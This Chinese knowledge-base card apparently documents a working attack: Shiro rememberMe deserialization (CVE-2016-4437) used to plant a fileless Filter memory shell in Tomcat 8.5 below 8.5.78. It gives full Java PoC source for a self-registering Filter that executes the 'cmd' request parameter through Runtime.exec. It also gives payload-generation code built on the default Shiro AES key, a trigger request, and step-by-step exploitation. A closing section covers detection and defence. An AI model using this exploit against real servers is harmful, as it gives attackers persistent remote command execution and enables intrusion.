---
id: web-java-framework-shiro-rememberme-filter-memshell-static-block
title: Shiro rememberMe 单请求注入 Filter 内存马：TemplatesImpl 静态块自注册 ApplicationFilterConfig（Tomcat 8.5 < 8.5.78）
type: scenario
domain: web
path: web/java/framework/shiro
technique: shiro-rememberme-filter-memshell-static-block
tags:
- java
- shiro
- rememberme
- deserialization
- memshell
- filter
- tomcat
- standardcontext
- templatesimpl
- applicationfilterconfig
- persistence
cve:
- CVE-2016-4437
affected_versions: Tomcat 8.5 < 8.5.78（原文实测 8.5.37/8.5.60/8.5.70/8.5.77 可注入，8.5.78/8.5.79/8.5.81 失败）
severity: critical
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V612
  verified_at: '2026-11-12T19:48:15+08:00'
  notes: 已对照原文全文与14张图核对：图01 payload 生成、图02 rememberMe 请求、图03/04 unable to deserialize 包装栈、图05-07 CB链BeanComparator/PropertyUtilsBean调试、图08 静态块调试代码、图09 类加载器toString后NPE、图10/14 Tomcat 8.5.79 getResources() @Deprecated return null、图11 BehinderFilter.<clinit> NPE栈、图12 8.5.50 return this.resources、图13 换8.5.50后 cmd=calc 弹计算器端到端成功。CVE-2016-4437与默认key kPH+bIxk5D2deZiIxcaaaA==、TemplatesImpl静态块注册FilterDef/ApplicationFilterConfig/FilterMap链路均与原文一致；affected_versions=Tomcat 8.5<8.5.78 与原文逐版本实测（8.5.37/60/70/77可，8.5.78/79/81不可）一致。已修正利用步骤第1条与PoC判空不一致的表述。未验证点：未本机复现；RASP拦截等防御性条件为通用补充。
url: /docs/web/java/framework/shiro/web-java-framework-shiro-rememberme-filter-memshell-static-block/
draft: false
kb_aliases:
- Shiro Filter 内存马
- Shiro 单请求内存马
- TemplatesImpl 静态块注册 Filter
- ApplicationFilterConfig 内存马
- filterConfigs 手工注册
- Shiro 无文件落地内存马
---

## 一句话结论

在 Shiro rememberMe 反序列化可用（默认/已知 AES 密钥 + CB 等 gadget）的前提下，把恶意类同时写成 `AbstractTranslet` 与 `Filter`，由 `TemplatesImpl` 在反序列化时加载并初始化，其静态块通过 `WebappClassLoaderBase#getResources().getContext()` 取得 `StandardContext`，再反射构造 `ApplicationFilterConfig` 放入 `filterConfigs`、`addFilterMap` 注册 `/*` 映射，即可在单个 rememberMe 请求内完成无文件落地的 Filter 内存马注入；该公开 API 取 context 路径仅在 Tomcat 8.5 < 8.5.78 有效。

## 原理

- **入口是 Shiro rememberMe 反序列化**：rememberMe Cookie 为 `Base64(IV + AES-CBC(Java 序列化数据))`，使用默认密钥（如 `kPH+bIxk5D2deZiIxcaaaA==`）或已泄露密钥时，服务端在无有效会话时会对 Cookie 解密并 `readObject`，可触发 CommonsBeanutils 等 gadget 链，链尾落到 `TemplatesImpl`。
- **TemplatesImpl 的执行阶段**：`getOutputProperties()` → `newTransformer()` → `getTransletInstance()` → `defineTransletClasses()` → `TransletClassLoader.defineClass()`。恶意类作为 `_bytecodes` 被定义后，`getTransletInstance()` 会调用其无参构造器；类初始化（`<clinit>`）也在首次主动使用前执行。因此把注册逻辑放在**静态块**（或构造器）都能在反序列化时执行。恶意类必须继承 `AbstractTranslet`，同时再 `implements Filter`，才能既被 TemplatesImpl 接受又作为 Filter 实例使用。
- **Tomcat 的 Filter 容器结构**：`StandardContext` 维护三份数据——`filterDefs`（FilterDef：名称、Filter 实例、类名）、`filterMaps`（FilterMap：filterName 与 URLPattern）、`filterConfigs`（name → `ApplicationFilterConfig`）。请求进入时 `ApplicationFilterFactory` 按 `filterMaps` 组装 `ApplicationFilterChain`，并按 name 从 `filterConfigs` 取配置。
- **为什么手工构造 ApplicationFilterConfig 能生效**：`StandardContext.addFilterDef(filterDef)` 只登记定义；正常流程由 `filterStart()` 遍历 `filterDefs` 创建 `ApplicationFilterConfig` 并放入 `filterConfigs`。本手法跳过 `filterStart()`，直接用反射调用 `ApplicationFilterConfig(Context, FilterDef)` 构造器创建配置对象，再把它 `put` 进 `StandardContext.filterConfigs`，最后 `addFilterMap` 注册 `/*`（dispatcher=REQUEST）。请求到达时容器按映射找到 name 对应的配置，即可调用恶意 Filter，无需重启或初始化整个 Filter 链。
- **context 从线程上下文类加载器取**：反序列化时没有 request 对象，`Thread.currentThread().getContextClassLoader()` 是 `WebappClassLoaderBase`，其 `getResources()` 返回 `WebResourceRoot`（`StandardRoot`），`getContext()` 即 `StandardContext`。该 getter 在 Tomcat 8.5.78 起被废弃并恒返回 null，因此静态块会在这一行空指针，整条链失败（版本边界详见关联卡）。
- **为什么放在静态块**：TemplatesImpl 定义并实例化 translet 的过程中必然触发类初始化，静态块不需要依赖实例字段；即使构造器被多次调用，注册逻辑也只执行一次。异常被静态块内 `try/catch` 吞掉时注入静默失败，只会留在服务端日志里。

## 触发条件

- 目标使用 Shiro，rememberMe 反序列化可利用：使用默认/已知 AES 密钥，且 classpath 存在可用 gadget（原文用 commons-beanutils 的 CB 链；目标无 CC 依赖也可）。
- 容器为 Tomcat 8.5，且小版本 **< 8.5.78**（8.5.78+ `WebappClassLoaderBase#getResources()` 恒返回 null，静态块 NPE）。
- 反序列化载荷未超过请求头 8KB 限制；超过时需改用两段式加载（见关联卡）。
- 目标容器 Webapp ClassLoader 下 `javax.servlet` 等依赖可用，恶意 Filter 字节码与目标 JDK 版本兼容。
- 未被 RASP/反序列化过滤器拦截 `TemplatesImpl`、`defineClass` 与 `StandardContext` 的 Filter 注册调用。

## 利用步骤

1. 编写 `AbstractTranslet implements Filter` 的恶意类：静态块内完成 StandardContext 获取与 Filter 注册；`doFilter` 读取 `cmd` 参数并 `Runtime.exec`（原文 PoC 未判空，实际使用时建议判空后 `chain.doFilter` 放行，避免影响正常业务）。
2. 编译该类，用 javassist `ClassPool.get(...).toBytecode()` 取字节码，作为 `TemplatesImpl._bytecodes` 交给 CB 链（如 `CommonsBeanutils1Shiro`）生成序列化 payload。
3. 用 Shiro AES key 对 payload 做 AES 加密后 Base64，放入 `Cookie: rememberMe=<base64>`，向目标发送请求触发反序列化。
4. 若静态块执行成功，Filter 已注册；访问任意路径带 `?cmd=calc` 验证命令执行（原文在 Tomcat 8.5.50 上弹计算器成功）。
5. 若失败，查看服务端日志：`unable to deserialize argument byte array` 外层是 Shiro 包装，真正根因在静态块；按关联卡确认 Tomcat 小版本是否 < 8.5.78。

## PoC

恶意 Filter（静态块自注册 + cmd 执行，省略 import）：

```java
public class BehinderFilter extends AbstractTranslet implements Filter {
    static {
        try {
            // StandardContext：仅 Tomcat 8.5 < 8.5.78 的 getResources() 返回非 null
            WebappClassLoaderBase cl = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext context = (StandardContext) cl.getResources().getContext();

            // FilterDef
            Filter filter = new BehinderFilter();
            FilterDef filterDef = new FilterDef();
            filterDef.setFilter(filter);
            filterDef.setFilterName("EvilFilter");
            filterDef.setFilterClass(filter.getClass().getName());
            context.addFilterDef(filterDef);

            // FilterConfig：反射构造后直接放入 filterConfigs，跳过 filterStart()
            Constructor ctor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
            ctor.setAccessible(true);
            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) ctor.newInstance(context, filterDef);
            Field f = StandardContext.class.getDeclaredField("filterConfigs");
            f.setAccessible(true);
            ((Map) f.get(context)).put("EvilFilter", filterConfig);

            // FilterMap
            FilterMap filterMap = new FilterMap();
            filterMap.setFilterName("EvilFilter");
            filterMap.addURLPattern("/*");
            filterMap.setDispatcher(DispatcherType.REQUEST.name());
            context.addFilterMap(filterMap);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override public void transform(DOM document, SerializationHandler[] handlers) {}
    @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {}
    @Override public void init(FilterConfig filterConfig) {}
    @Override public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain)
            throws ServletException, IOException {
        Runtime.getRuntime().exec(req.getParameter("cmd"));
        chain.doFilter(req, resp);
    }
    @Override public void destroy() {}
}
```

载荷生成（CB 链 + AES，原文用 CommonsBeanutils1Shiro 与 javassist）：

```java
CtClass clazz = ClassPool.getDefault().get(BehinderFilter.class.getName());
byte[] payloads = new CommonsBeanutils1Shiro().getPayload(clazz.toBytecode());
AesCipherService aes = new AesCipherService();
byte[] key = Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
System.out.printf(aes.encrypt(payloads, key).toString());   // 放入 Cookie: rememberMe=
```

验证请求：

```http
GET /shirodemo_war_exploded/?cmd=calc HTTP/1.1
Host: target:8080
Cookie: rememberMe=<加密后的 Base64>
```

## 变体与关联

- **注册方式变体**：本卡用 `ApplicationFilterConfig` 反射构造 + `filterConfigs.put` + `addFilterMap`；另一条常见路径是 `addFilterDef` + `addFilterMapBefore` + `filterStart()`（映射顺序可插到业务 Filter 之前），见关联的 Tomcat 动态 Filter 内存马卡。`addFilterMap` 追加在链尾，若前置 Filter 提前返回可能拦截不到，必要时改用 `addFilterMapBefore`。
- **context 获取变体**：`getResources()` 公开方法只在 Tomcat 8.5 < 8.5.78 有效；新版本可反射 `WebappClassLoaderBase.resources` 字段（见关联卡），或从 request/ServletContext、Spring Boot 的 `ServletWebServerApplicationContext` 获取。
- **投递变体**：载荷超过 8KB 请求头限制时，用两段式 ShellLoader 从 POST body 加载真正的注入类（见关联卡）；也可换用其他反序列化入口（JNDI、fastjson、XStream 等）而不限于 Shiro。
- **关联**：[[web-java-component-tomcat-dynamic-filter-memshell]]（StandardContext 动态注册 Filter 的完整机制与检测）、[[web-java-framework-shiro-rememberme-two-stage-memshell-loader]]（8KB 限制的两段式投递）、[[web-java-deserialization-jndi-tomcat-filter-memshell]]（JNDI 触发同型内存马）、[[web-java-classloader-deserialization-memshell-loader-selection]]（TemplatesImpl/BCEL/Groovy 触发阶段选型）、[[web-java-component-tomcat-webappclassloader-getresources-null-context]]（本卡依赖的 Tomcat 版本边界）。
- **静态块 vs 构造器**：TemplatesImpl 会调用无参构造器，两者都可放注册逻辑；静态块只执行一次，构造器在多次实例化时会重复执行，放静态块更稳。

## 检测与防御

- **反序列化侧**：升级 Shiro、轮换并随机化 rememberMe AES 密钥、禁用 rememberMe；对反序列化入口启用 ObjectInputFilter/JEP 290 或 RASP 的 `TemplatesImpl` 黑名单。
- **内存马侧**：运行时枚举 `StandardContext.filterDefs`/`filterConfigs`/`filterMaps`，关注运行期新增的 Filter 名称、`/*` 映射与无 web.xml/注解来源的 Filter；监控 `addFilterDef`/`addFilterMap`/`ApplicationFilterConfig` 构造器与 `ClassLoader#defineClass` 调用。
- **日志侧**：日志中出现 `Unable to deserialize argument byte array` 伴随 translet 类 `<clinit>` 的 `NullPointerException`，是内存马注入尝试的强信号（即便因 Tomcat 版本失败也应告警）。
- **防御边界**：仅升级 Tomcat 8.5.78+ 只会打断这条复制粘贴 payload，不构成安全边界（`resources` 字段仍可反射）；根本防御是消除反序列化入口与内存马检测能力。进程重启可清除已注册 Filter，但需先排查入口与凭据。
